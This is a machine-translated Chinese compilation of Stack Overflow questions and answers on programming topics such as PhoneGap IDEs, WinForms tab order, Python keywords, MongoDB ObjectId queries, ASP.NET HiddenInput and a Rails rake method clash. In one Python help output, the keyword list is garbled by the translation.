> 时间：2012-06-21T11:42:09.350

看看[NSB/App Studio](http://www.nsbasic.com/app)。IDE 的感觉类似于 Visual Studio，它允许您使用 JavaScript 和/或 BASIC 进行编程。它直接编译到PhoneGap。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-17T18:52:56.070

您可以使用[Adob​​e Dreamweaver CS6通过](http://phonegap.com/2012/04/24/adobe-dreamweaver-cs6-supports-phonegap-build/)[PhoneGap](http://phonegap.com/)构建这些移动应用程序。

或者，如果您想使用不同的 IDE，那么 -

对于 Android - Eclipse

对于 iOS - XCode

希望能帮助到你。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:12:24.243

您可以使用 Eclipse！或查看 appMobi XDK (google it)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-16T10:09:04.357

您可以将 eclipse 与 phonegap 插件一起使用。通过此链接将插件安装到 Eclipse

[https://svn.codespot.com/a/eclipselabs.org/mobile-web-development-with-phonegap/tags/r1.2/download](https://svn.codespot.com/a/eclipselabs.org/mobile-web-development-with-phonegap/tags/r1.2/download)

并阅读此[链接](http://wiki.phonegap.com/w/page/34483744/PhoneGap%20Eclipse%20PlugIn%20for%20Android)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-07-15T13:44:14.130

NetBeans 7.4 支持 PhoneGap 开发[https://netbeans.org/community/releases/74/](https://netbeans.org/community/releases/74/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-16T10:12:54.270

您可以使用*Dreamweaver CS 5.5*，它允许您使用流行的*PhoneGap 框架*构建原生移动应用程序- 并为 iOS 和 Android 提供丰富的原生应用程序，而无需学习新的语言或工具。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-07-16T07:59:04.570

Dreamweaver，Web matrix 是很好的 IDE 或 Cloud9 IDE 用于云编辑器：D

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-04-07T08:28:29.580

实际上 NetBeans 7.4 支持 Apache Cordova 而不是 Phonegap。这样您就可以开发跨平台应用程序，而无需安装任何额外的插件。你可以在这里阅读 Phonegap 和 Apache Cordova [phonegap.com](http://phonegap.com/2012/03/19/phonegap-cordova-and-what%E2%80%99s-in-a-name/)之间的区别。 我不认为有另一个 IDE 允许它不添加任何插件。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-07-22T03:03:49.777

[Monaca](http://monaca.mobi/en/)在线 IDE 为我节省了大量时间和金钱。它工作得很好，他们将漂亮的用户界面（温泉用户界面）与项目集成在一起。此外，它们为您提供免费的服务器空间，让您可以从您的应用程序在线获取和编辑数据！如果你是新的，我强烈推荐它作为开始的地方。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2015-06-06T09:58:34.613

Sublime text 3、VS Code、Brakcet io、Web Storm、eclipse、visual studio、web matrix、dream weaver、notepad plus

# c# - TabIndex 无法正常工作

> ID：11052265
> 
> 赞同：8
> 
> 时间：2012-06-15T14:08:27.573
> 
> 标签：c#, .net, winforms

我有一个 Windows 窗体应用程序。在表单上有三个组框。每个组合框都包含一些控件。请看图片。 ![形式](../Images/e8b4f0b9d60ee3546771c83ce145df5f.png)

有一个包含几个复选框的组框“标志”。“标志”在“groupbox1”中。我使用 Tab 键浏览每个控件，但它不适用于“标志”中的复选框。我确实为每个控件设置了正确的 tabindex。

它适用于文本框和按钮，但适用于复选框。

为什么？感谢帮助。

**编辑**

```
 // groupBox2
        // 
        this.groupBox2.Controls.Add(this.pictureBox10);
        this.groupBox2.Controls.Add(this.pictureBox9);
        this.groupBox2.Controls.Add(this.pictureBox8);
        this.groupBox2.Controls.Add(this.pictureBox7);
        this.groupBox2.Controls.Add(this.chkStoplight);
        this.groupBox2.Controls.Add(this.lblStoplight);
        this.groupBox2.Controls.Add(this.chkIsCount);
        this.groupBox2.Controls.Add(this.chkExceptionFlag);
        this.groupBox2.Controls.Add(this.chkIsActive);
        this.groupBox2.Controls.Add(this.lblIsActive);
        this.groupBox2.Controls.Add(this.lblExceptionFlag);
        this.groupBox3.Controls.Add(this.lblIsCount);
        this.groupBox2.Location = new System.Drawing.Point(16, 201);
        this.groupBox2.Name = "groupBox2";
        this.groupBox2.Size = new System.Drawing.Size(321, 70);
        this.groupBox2.TabIndex = 10;
        this.groupBox2.TabStop = true;
        this.groupBox2.Text = "Flags";

        // 
        // chkStoplight
        // 
        this.chkStoplight.AutoSize = true;
        this.chkStoplight.Location = new System.Drawing.Point(44, 25);
        this.chkStoplight.Name = "chkStoplight";
        this.chkStoplight.Size = new System.Drawing.Size(15, 14);
        this.chkStoplight.TabIndex = 0;
        this.chkStoplight.UseVisualStyleBackColor = true;

        In the property, I found TabStop is true for chkStoplight. 
```

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-15T14:17:08.053

对于**System.Windows.Forms.GroupBox**：

您应该确保您的 GroupBox`flag`具有适当的 TabIndex 集。

来自[MSDN - 如何：在 Windows 窗体上设置 Tab 键顺序](https://docs.microsoft.com/en-us/dotnet/framework/winforms/controls/how-to-set-the-tab-order-on-windows-forms)：

> 此外，默认情况下，GroupBox 控件有自己的 TabIndex 值，它是一个整数。GroupBox 控件本身不能在运行时获得焦点。因此，GroupBox 中的每个控件都有自己的十进制 TabIndex 值，从 .0 开始。自然，随着 GroupBox 控件的 TabIndex 增加，其中的控件也会相应增加。如果将 TabIndex 值从 5 更改为 6，则其组中第一个控件的 TabIndex 值将自动更改为 6.0，依此类推

此外，请确保GroupBox的[TabStop](http://msdn.microsoft.com/en-US/library/system.windows.forms.groupbox.tabstop(v=vs.80))`flag`属性未设置为 false。我相信 false 是默认值。

对于**System.Windows.Controls GroupBox**：

确保设置了[GroupBox.IsTabStop](http://msdn.microsoft.com/en-us/library/system.windows.controls.control.istabstop.aspx)属性。这也默认为 false。

~~**更新：**您的所有控件似乎都被添加到`groupBox3`. 您应该确保它们中的每一个都仅添加到其包含的组框中。例如，`checkBox1`,`checkBox2`和`checkBox3`都应该被添加到`flag`，它本身应该被添加到`groupBox1`。 `groupBox3`应该只包含 Back、Next、Finish 和 Cancel。~~

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-06-15T08:18:38.623

我发现在 WinForms 组框中获取选项卡顺序的唯一方法是在生成的 InitializeControl 方法中更改控件添加到组框中的顺序。

如果您有多个分组框，则必须检查将分组框添加到其容器中的顺序并可能更改它。

我真的不喜欢编辑生成的代码，但据我所知，这是解决此问题的唯一方法。

设置组框的 TabStop 属性根本没有帮助。

# python - Python 关键字角色

> ID：11052270
> 
> 赞同：-2
> 
> 时间：2012-06-15T14:08:40.313
> 
> 标签：python, keyword

我在网上查找了所有 Python 关键字的列表以及它们的作用，但是我只能找到关键字列表而没有解释它们的作用。示例：[http](http://docs.python.org/release/2.3.5/ref/keywords.html) ://docs.python.org/release/2.3.5/ref/keywords.html 。所以基本上，如果我想知道关键字是什么，我必须在网上寻找它。虽然这不是什么大问题，但我相信一定有一个来源将所有这些信息进行了分组，从而加快了关键字的学习过程。

所以我想知道这里是否有人可以将我推荐到可以找到所有这些信息的网站。

谢谢 ！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:13:00.177

奇怪的是，它是 google 搜索[python 关键字和解释的](https://www.google.co.za/search?q=python+keywords+and+explanations&ie=utf-8&oe=utf-8&aq=t&rls=org.mozilla:en-US:official&client=firefox-a)[第一个结果](http://zetcode.com/tutorials/pythontutorial/keywords/)。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-15T14:19:58.040

在[python 解释器](http://docs.python.org/tutorial/interpreter.html)提示符下：

```
>>> 帮助（）

[为简洁而省略的行]

要获取可用模块、关键字或主题的列表，请键入“modules”，
“关键字”或“主题”。每个模块还附带一行摘要
它的作用；列出其摘要包含给定单词的模块
例如“垃圾邮件”，输入“模块垃圾邮件”。

帮助>关键字

这是 Python 关键字的列表。输入任何关键字以获得更多帮助。

如果打印，则为 elif
其他进口加注
断言，除非作为回报
break exec 是尝试
类终于 lambda 而
继续不与
def from or yield
德尔全球通行证                

帮助>

```

现在要获取有关例如 break 的信息，只需键入“break”，然后按 enter。

此外，如果您需要有关当前正在运行的 python 版本的关键字的信息（例如`yield`，我的 python 版本中的关键字是什么？），这里有[关键字模块](http://docs.python.org/library/keyword.html)：

```
>>> from keyword import kwlist, iskeyword
>>> kwlist
['and', 'as', 'assert', 'break', 'class', 'continue', 'def', 'del', 'elif', 
'else', 'except', 'exec', 'finally', 'for', 'from', 'global', 'if', 'import', 
'in', 'is', 'lambda', 'not', 'or', 'pass', 'print', 'raise', 'return', 'try', 
'while', 'with', 'yield']
>>> iskeyword("and")
True 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-06-15T14:19:48.873

根据您的 Python 发行版是否安装了文档，您可以通过 Python 解释器中的交互式帮助菜单直接访问关键字信息：

```
>>> 帮助（）

欢迎来到 Python 2.7！这是联机帮助实用程序。

...

要获取可用模块、关键字或主题的列表，请键入“modules”，
“关键字”或“主题”。每个模块还附带一行摘要
它的作用；列出其摘要包含给定单词的模块
例如“垃圾邮件”，输入“模块垃圾邮件”。

帮助>关键字

这是 Python 关键字的列表。输入任何关键字以获得更多帮助。

如果打印，则为 elif
其他进口加注
断言，除非作为回报
break exec 是尝试
类终于 lambda 而
继续不与
def from or yield
德尔全球通行证

帮助>和
布尔运算
******************

...

表达式“x 和 y”首先计算 *x*；如果 *x* 是假的，它的
返回值；否则，*y* 被评估并得到结果值
被退回。
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T14:11:51.690

[Python 教程](http://docs.python.org/tutorial/)涵盖了Python 语言及其关键字。它解释了从基础到高级的语言，这对初学者很有用（例如，从基础开始`if`到`else`更高级的`lambda`和`yield`）。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-15T14:14:13.507

[Python 语言参考](http://docs.python.org/reference/)讨论了 Python的结构和语法。所有这些关键字都在此处讨论，只需查看目录即可，但并非全部收集到一个列表中。

# wix - Wix3.5 和 Votive 能否为 Windows Installer 4.0 生成 MSI 安装程序？

> ID：11052273
> 
> 赞同：1
> 
> 时间：2012-06-15T14:08:46.323
> 
> 标签：wix, windows-installer, setup-deployment, wix3.5, votive

我可以从 Visual Studio 2010 的单个 Wix 3.5 VOTIVE 生成不同的 Windows 安装程序版本（4、4.5 或 5.0）.MSI。

现在它正在创建 .msi，它只在装有 Windows Installer 5.0（Server 2008 R2 和 Windows 7）的平台上运行。

我希望它生成可以在带有 Windows Installer 4.0（主要是 Windows Server 2008）的平台上运行的 .msi。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:13:53.780

在 Package 元素的 InstallerVersion 属性中指定受支持的最低 Windows Installer 版本：

对于 Windows Installer 4 或更高版本：

```
<Package InstallerVersion="400" 
```

对于 Windows 安装程序 4.5 或更高版本：

```
<Package InstallerVersion="405" 
```

# authentication - IIS 中缺少身份验证方法

> ID：11052275
> 
> 赞同：15
> 
> 时间：2012-06-15T14:08:57.037
> 
> 标签：authentication, iis, iis-7, iis-7.5

我们在两台服务器上安装了 IIS。在第一台服务器上，我们可以访问我们需要的所有身份验证方法。但在第二个服务器上，其中一半丢失了。我们尝试在第二台服务器上重新安装 IIS，但没有成功。

![在此处输入图像描述](../Images/6552744f490c782f2d577eff0c08ed3d.png)

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-06-15T14:22:09.020

您需要将这些作为角色添加到 IIS。

-转到您的服务器管理器（开始->管理工具->服务器管理器）

-扩展角色和 Web 服务器 (IIS)

-向下滚动到角色服务，然后单击右侧的添加角色服务

- 在安全部分启用您需要的所有类型。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-06-15T14:15:18.867

这是如何做到的：

1.  打开控制面板
2.  转到程序和功能
3.  单击“打开或关闭 Windows 功能”
4.  向下滚动`Internet Information Services`并展开它
5.  扩张`World Wide Web Services`
6.  扩张`Security`
7.  检查您需要的任何身份验证方法。

# python - 发布网络表单后，如何从结果页面获取值？

> ID：11052285
> 
> 赞同：0
> 
> 时间：2012-06-15T14:09:26.103
> 
> 标签：python, http, post, python-requests

我正在使用请求（如 Daniel Roseman 的建议）在网络表单上发布：

```
url = "http://mascot.proteomics.dundee.ac.uk/cgi/search_form.pl?FORMVER=2&SEARCH=MIS"
data = {'SEARCH':'MIS'}
files = {'JG-C1-1A.mgf' : open('/homes/ndeklein/Cantrell/JG-C1-1.mgf','rb')}    print 
```

当我打印`r.ok`并且`r.request`我得到 200 好的时候，所以 POST 工作。当我打印 r.content 时，我没有得到结果页面，而是提交表单的页面的 html。当我`{'SEARCH':'MIS'}`从数据中删除时，`r.content`返回一个缺少搜索类型的 html 错误页面，所以我知道如果帖子中有问题，我会收到错误消息。

那么我怎样才能得到结果页面呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:27:19.027

`httplib`老实说，没有理由使用。它是一个低级接口，对于您想要做的事情来说是不必要的复杂。至少，使用`urllib2`，它将跟随任何重定向。但可能你最好的选择是使用[第三方`requests`模块](https://github.com/kennethreitz/requests)，这会让这一切变得更容易。

# mongodb - mongoDB 查询“WHERE _id > 阈值”

> ID：11052286
> 
> 赞同：29
> 
> 时间：2012-06-15T14:09:26.483
> 
> 标签：mongodb, filter

我怎样才能有一个类似于 SQL “...WHERE _id > threshold”的 mongo 查询

我尝试了以下，但它没有给我任何结果。

```
 db.things.find(_id: {$gt: someid} }); 
```

是不是因为 _id 字段有点特殊，因为它有格式？

```
_id : {"$oid" : "someid"} 
```

* * *

## 回答 #1

> 赞同：40
> 
> 时间：2012-06-15T14:15:01.423

## 比较喜欢和喜欢

mongo 中的`_id`键不是（默认情况下）字符串 - 它是 mongo objectId。

您需要与相同的类型进行比较才能获得有意义的结果：

```
var ObjectId = require('mongodb').ObjectID;
var oid = new ObjectId();
db.things.find(_id: {$gt: oid}); 
```

## 不要阅读 mongoexport 文件

Mongo 导出文件如下所示：

```
{ "_id" : { "$oid" : "4f876b00c56da1fa6a000030" }, ... 
```

这是对象 ID 的 json 表示。Mongo 不希望您在实际查询数据库时使用这种语法。这将不起作用：

```
# will not work
db.things.find("_id.$oid": {$gt: "string"}); 
```

## id 作为字符串

如果您将 id 作为字符串，您将执行以下操作：

```
var ObjectId = require('mongodb').ObjectID;
var str = "123456789012345678901234";
var oid = new ObjectId(str);
db.things.find(_id: {$gt: oid}); 
```

## id 作为*部分*字符串

如果您拥有的字符串不是有效的 oid（不是 24 个字符长），您只会从 mongo 获得一个异常 - 或者取决于您的驱动程序，一个新的 oid。如果您有部分对象 id，您可以用 0 填充以生成有效的 oid，因此允许通过部分对象 id 进行查找。例如：

```
var ObjectId = require('mongodb').ObjectID;
var oid = new ObjectId(str + "0000");
db.things.find(_id: {$gt: oid}); 
```

# intellij-idea - 关闭 IntelliJ 中所有打开文件的快捷方式

> ID：11052292
> 
> 赞同：28
> 
> 时间：2012-06-15T14:10:00.337
> 
> 标签：intellij-idea, keyboard-shortcuts

IntelliJ IDEA 中是否有关闭所有打开的窗口的快捷方式？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-06-15T14:27:55.473

默认键盘映射中没有快捷方式，但您可以在“**关闭所有”**操作的键盘映射设置中指定它。

* * *

## 回答 #2

> 赞同：11
> 
> 时间：2014-07-24T19:05:52.320

您还可以从菜单 > 窗口 > 编辑器选项卡 > 全部关闭（或在 Mac 上：Command + F4）关闭所有打开的文件

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2019-06-28T17:10:17.583

没有默认快捷方式，但您可以使用**Search Everywhere**快捷方式来调用它：

`Shift`+ `Shift`+ 类型：`Close All`+`Enter`

或者：

`Ctrl`+ `T`+ 类型：`Close All`+`Enter`

另一种只是为了好玩：

`Ctrl`+ `Shift`+ `A`+ 类型：`Close All`+`Enter`

如果你使用 VIM：

`ESC` `:qa`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2020-04-05T11:41:47.873

我在我的 Pycharm 中通过添加关键字快捷方式来做到这一点：

1.  转到设置`ctrl+Alt+S`

2.  转到可以搜索（全部关闭）的键盘映射并为其添加所需的快捷键。

# asp.net-mvc - 在 Razor 中使用 Html.EditorForModel 渲染时，ASP.Net [HiddenInput] 数据属性不起作用？

> ID：11052293
> 
> 赞同：10
> 
> 时间：2012-06-15T14:10:02.460
> 
> 标签：asp.net-mvc, asp.net-mvc-3, razor

我有以下模型：

```
public class Product
{
    [HiddenInput(DisplayValue = false)]
    public int ProductID { get; set; }

    [Required(ErrorMessage="Please enter a product name")]
    public string Name { get; set; }

    [Required(ErrorMessage="Please enter a description")]
    [DataType(DataType.MultilineText)]
    public string Description { get; set; }

    [Required]
    [Range(0.01, double.MaxValue, ErrorMessage="Please enter a positive price")]
    public decimal Price { get; set; }

    [Required(ErrorMessage="Please specify a category")]
    public string Category { get; set; }

    public byte[] ImageData { get; set; }

    [HiddenInput(DisplayValue = false)]
    public string ImageMimeType { get; set; }
} 
```

我正在引用`System.Web.Mvc`和`System.ComponentModel.DataAnnotations`.

然后，我将其呈现在我的视图中，如下所示：

```
<h1>Edit @Model.Name</h1>

@using (Html.BeginForm("Edit", "Admin", FormMethod.Post, new { enctype = "multipart/form-data" })) {
@Html.EditorForModel()

<div class="editor-lable">Image</div>
<div class="editor-=field">
    @if (Model.ImageData == null)
    {
        @:None
        }
    else
    {
        <img width="150" height="150" src="@Url.Action("GetImage", "Product", new { Model.ProductID })" />
    }
    <div>Upload new image: <input type="file" name="Image" . /></div>
</div>
<input type="submit" value="Save" />
@Html.ActionLink("Cancel and return to List", "Index") 
```

}

问题是，虽然`[Required]`注释工作正常，但`[HiddenInput]`字段实际上并没有隐藏。html 源代码甚至没有显示 hidden 属性。

为什么不`Html.EditorForModel`将`[HiddenInput]`属性应用于这些属性？有任何想法吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2015-01-26T17:47:43.640

就我而言，我不得不写`[HiddenInput]`as`[HiddenInput(DisplayValue=false)]`

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-12-20T12:12:17.530

我有一个类似的问题，在我的情况下，问题是由于 System.Web.Mvc 参考引起的。

我正在创建一个 MVC 3 应用程序，但我没有添加 System.Web.Mvc 的版本 3，而是添加了版本 4。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-03-23T20:39:26.147

在我的情况下，这个问题的原因是包含模型类和主 Web 应用程序项目的程序集引用了不同版本的 System.Web.Mvc 程序集。

如果您有几个项目引用 System.Web.Mvc 程序集 - 确保所有项目中使用的版本相同。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-12-09T16:27:20.090

我有同样的问题。

原来我在包含模型的项目中有 System.Web.Mvc 的 5.2.2.0 版本，在 Web 应用程序项目中有它的 5.2.0.0 版本。

要安装正确的版本，您需要在 NuGet 包管理器中运行以下命令：

> `install-package Microsoft.Aspnet.Mvc ProjectName -version X`

将 ProjectName 替换为您的项目名称，将 X 替换为您需要安装的版本。

例如：

> `install-package Microsoft.Aspnet.Mvc TestProject.Web -version 5.2.2.0`

如果省略版本号，NuGet 只会下载并安装最新版本。

完成此操作后，我还需要将单元测试项目更新为与 Web 应用程序项目相同的版本。您可能需要这样做。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-15T14:22:49.940

如果您使用脚手架，生成器将使用隐藏在视图中的类型设置输入标签。这取决于 T4 模板。

如果您手动创建视图，则必须手动设置该字段。例如

```
@Html.HiddenFor(model => model.Id) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-12-14T04:15:04.240

我也有这个问题。由于同一解决方案的不同项目中 System.Web.Mvc 的不同版本而出现此问题。我再次删除并添加了引用，以便所有项目（4.0.0.1）都相同。

# php - 如何删除 codeigniter 代码中的 index.php？

> ID：11052294
> 
> 赞同：0
> 
> 时间：2012-06-15T14:10:15.340
> 
> 标签：php, codeigniter, url

我想从 codeigniter 的 url 中删除 index.php 。所以在用户指南中，有办法通过编辑 .htaccess 来做到这一点。但我的主机不允许编辑它。有什么办法可以处理codeigniter的代码吗？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-01-18T00:01:18.620

将以下代码放入 .htaccess

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ index.php/$1 [L]  

<Files "index.php">
AcceptPathInfo On
</Files> 
```

并放入`$config['index_page'] = '';`配置文件中，而不是**`$config['index_page'] = '';`** 将`.htaccess`近端放在`index.php`系统和应用程序文件夹之外

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:20:56.017

抱歉，恐怕这是不可能的。CodeIgniter（或一般的浏览器）需要一个索引文件，通过编辑 .htaccess 文件告诉浏览器不要显示 'index.php' 部分，但它仍然存在。删除 index.php 文件本身是愚蠢的，因为没有它您的网站将无法运行。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-15T14:12:26.120

我不认为有办法在不编辑 htaccess 文件的情况下做到这一点。

# ios - 具有重定向的自定义 UINavigationBar 图形

> ID：11052295
> 
> 赞同：1
> 
> 时间：2012-06-15T14:10:25.813
> 
> 标签：ios, uinavigationbar

因此，我使用以下代码（ruby 运动语法）在我的应用程序委托中成功设置了自定义图形（iOS 5）：

```
navbar = UIImage.imageNamed "navbar.png"
navbutton = UIImage.imageNamed("navbutton.png").resizableImageWithCapInsets(UIEdgeInsetsMake(0,5,0,5))
navbackbutton = UIImage.imageNamed("navback.png").resizableImageWithCapInsets(UIEdgeInsetsMake(0,14,0,5))

UINavigationBar.appearance.setBackgroundImage(navbar, forBarMetrics:UIBarMetricsDefault)
UIBarButtonItem.appearance.setBackgroundImage(navbutton, forState:UIControlStateNormal, barMetrics:UIBarMetricsDefault)
UIBarButtonItem.appearance.setBackButtonBackgroundImage(navbackbutton, forState:UIControlStateNormal, barMetrics:UIBarMetricsDefault) 
```

很容易。唯一的问题是，现在我正在添加重定向支持，当视图变为横向时，导航栏图像保持 320px 宽并重复填充屏幕顶部的宽度......按钮被重新定位，但导航栏不是'不是动态的...

我怎样才能解决这个问题？

我知道在定向完成后会调用**didRotateFromInterfaceOrientation(orientation)**，所以如果我需要调用某种 UINavBarRefactor 方法，我认为这就是这样做的地方吗？

PS：如果有帮助，我使用[本教程](http://www.raywenderlich.com/12320/photoshop-for-developers-making-a-leather-navigation-bar)来学习如何样式化导航栏。不过，您不应该需要太多；我已经向您展示了上面那个教程中涉及的所有代码^^。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-21T13:11:41.643

您可以将另一个条形指标用于横向模式。

```
UINavigationBar.appearance.setBackgroundImage navbar_image,
  forBarMetrics: UIBarMetricsDefault
UINavigationBar.appearance.setBackgroundImage navbar_image_landscape,
  forBarMetrics: UIBarMetricsLandscapePhone 
```

其他选项也一样。

# algorithm - 寻找二叉树（BST）的最大深度

> ID：11052297
> 
> 赞同：0
> 
> 时间：2012-06-15T14:10:30.363
> 
> 标签：algorithm, data-structures, language-agnostic, binary-search-tree

> 给定二叉搜索树（BST）。迭代地找到二叉搜索树的最大深度。

我知道使用队列 [level order traversal] 的方法，但时间复杂度是 O(N)，因为我们需要访问整个树。但它不使用树是 BST 还是二叉树的信息。

BST 的算法是否保持不变，或者可以使用给定树是 BST 的事实来改进它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:13:52.233

我不认为一棵树是 BST 或没有改变它的事实，在最坏的情况下你仍然必须访问所有节点，这使得它成为 O(N)。我猜在最好的情况下你只需要做 O(log(N))，但这是最好的情况，你只需沿着树的深度向下走，并且不访问其他节点。

# ruby-on-rails - 尝试调用私有方法 + 与 .rake 文件冲突

> ID：11052303
> 
> 赞同：1
> 
> 时间：2012-06-15T14:10:42.153
> 
> 标签：ruby-on-rails, ruby

我正面临一个奇怪的错误。谁能解释一下这是什么原因。。

我有一个名为站点、设置和体验的模型。

设置和体验有数据库列“**位**”

在我的站点模型中，我有这个代码

```
 def populate_experiences_bit_set
    self.experiences.map(&:bit).inject(0, :|)
  end

  def populate_settings_bit_set
    self.settings.map(&:bit).inject(0, :|)
  end 
```

在我名为 2_28.rake 的 rake 文件中，有一个名为**bit的方法**

```
 def bit(klass)
    current_class = klass.find(:all)
    if current_class.count == 0
      return 1
    else
      return (current_class.last.bit * 2)
    end
  end 
```

此方法用于同一 rake 文件中的 rake 任务“get_value”之一。

在同一个文件中还有另一个名为 create_sites_report_data 的 rake 任务，其中有一行：

```
site.populate_experiences_bit_set 
```

现在当我运行 rake 任务时

```
rake releases:2.28:create_sites_report_data 
```

我收到一条错误消息

> " 尝试调用私有方法 /Users/rakeshshetty/.rvm/gems/ruby-1.9.2-p290/gems/activerecord-2.3.5/lib/active_record/attribute_methods.rb:236:in `method_missing' "

```
In console, this works fine 

>> s = Site/364
=> #<Site id: 364, name: "1 Field Ambulance - Detachment Wainwright", type: "Site", created_at: "2009-12-29 16:53:58", updated_at: "2009-12-29 16:53:58", short_name: "1 Field Am", self_updated_at: nil, last_updater_id: nil, vfp_id: "2BL0NFMI1", dup_reference_id: nil, field_id: nil, marked_as_deleted: false>
>> s.experiences.map(&:bit).inject(0, :|)
=> 0
>> s.settings.map(&:bit).inject(0, :|)
=> 64 
```

我将 2_28.rake 文件中的方法名称从 bit 替换为 bit_x Rake 工作正常

```
blsi1181a:cpi_2.24 rakeshshetty$ rails -v 
Rails 2.3.5 
blsi1181a:cpi_2.24 rakeshshetty$ ruby -v 
ruby 1.9.2p290 (2011-07-09 revision 32553) [x86_64-darwin11.3.0] 
```

我的问题是位是设置和体验中的一个字段。它如何调用 rake 方法函数 bit() ？这个 rake 文件是在应用程序加载后加载的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:29:33.383

我认为这是问题所在：

该模型没有`bit`方法，它使用“方法缺失”方法创建它（即，当您在对象上调用不存在的方法时，它会调用其 method_missing 方法，默认情况下会引发异常）。

ActiveRecord 使用缺少的方法来设置相关表的列的方法（即：

```
Site.new.bit -> the method does not exist -> method_missing -> 
  is there a column called 'bit'? -> yes -> create the method bit with this code 
```

现在，您`bit`在对象级别创建了一个方法。可能它打破了`method_missing`ActiveRecord 的方法：

```
Site.new.bit -> the method exists -> call that method 
```

资源：

*   [基本对象#method_missing](http://apidock.com/ruby/v1_9_3_125/BasicObject/method_missing)
*   [ActiveRecord::Base#method_missing](https://github.com/rails/rails/blob/v2.3.5/activerecord/lib/active_record/attribute_methods.rb#L232)

* * *

# 编辑：经过深入分析

如果您查看 ActiveRecord 源（接近错误）：

```
def method_missing(method_id, *args, &block)
  method_name = method_id.to_s

  if self.class.private_method_defined?(method_name)
    raise NoMethodError.new("Attempt to call private method", method_name, args)
  end

  [...] 
```

现在，试试这个任务：

```
namespace :rake_test do

  desc 'With bit method'
  task :with => :environment do

    def bit(klass)
      # Implementation
    end

    puts Object.private_method_defined?("bit")
    puts Settings.private_method_defined?("bit")

  end

  desc 'Without bit method'
  task :without => :environment do

    puts Object.private_method_defined?("bit")
    puts Settings.private_method_defined?("bit")

  end

end 
```

让我们运行它们：

```
rake rake_test:with ; rake rake_test:without 
```

输出：

```
true
true
false
false 
```

当您定义`bit`方法时，您处于对象上下文中（这不仅适用于 rake 任务文件，而且适用于每个 ruby​​ 脚本文件）。所以你定义了一个`Object.bit`方法；正如您从 Rails 源代码中看到的那样，在定义模型`bit`方法之前，它会尝试查看是否存在`Model.method`，如果存在，它会引发异常。

作为（就像每个标准类）的`Settings`类子类，您的定义破坏了事物。`Object``bit`

# ios - 手机差距iOS视频问题

> ID：11052304
> 
> 赞同：0
> 
> 时间：2012-06-15T14:10:43.307
> 
> 标签：ios, xcode, jquery-mobile, cordova

我正在尝试在我的 iOS 应用程序中加载具有自动播放功能的视频，然后在视频播放完毕后添加一个运行函数的事件。我的代码如下所示：

```
 $( "#videoPageA0" ).live( 'pageinit',function(event){
 var myPlayer = $("#videoA0").get(0);
 myPlayer.load();
 myPlayer.addEventListener("ended", $X.videoCallback);
 myPlayer.play();
 }); 
```

当页面加载时，视频会播放一两秒，然后冻结。这不会导致我的应用程序崩溃，因为我仍然可以使用标题中的按钮，有没有人遇到过类似的问题或知道解决方案？该代码在模拟器中运行良好，但在设备上失败。

以下是我的视频页面的 HTML 代码：

```
<div data-role="page" id="videoPageA0" style="overflow:hidden;">    
        <div data-role="header" class="header">
            <img src="images/link1.jpg" alt="" title="" class="link1"/>
            <img src="images/link2.jpg" alt="" title="" class="link2" />
            <img src="images/link3.jpg" alt="" title="" class="link3" />
        </div>
        <div data-role="content">
            <video id="videoA0" width="320" height="428" webkit-playsinline preload="metadata">  
                <source src="videos/test1.mp4" type="video/mp4" /> 
            </video>
        </div> 
```

我已经尝试过 mov 和 m4v 文件，但仍然无法正常工作。我正在使用 Xcode 4.3.3、phone gap 1.8 和 Jquery mobile 1.1.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T16:45:40.100

我对此的解决方案是使用 Obj-C 创建我自己的插件，然后在需要时使用 javascript 调用它。任务完成！

# android - 应用认证

> ID：11052306
> 
> 赞同：0
> 
> 时间：2012-06-15T14:10:44.967
> 
> 标签：android, security, authentication, ssl, certificate

应用程序如何向服务器验证自己？假设我发布了一个可以连接到我的 Web 服务器的 android 应用程序。

有什么办法可以保证客户使用我制作的应用程序，而不是第三方的应用程序？我认为可以进行逆向工程以获取我的应用程序的源代码（似乎 proguard 并不完全安全），因此第三方可以轻松地使应用程序冒充我的应用程序。

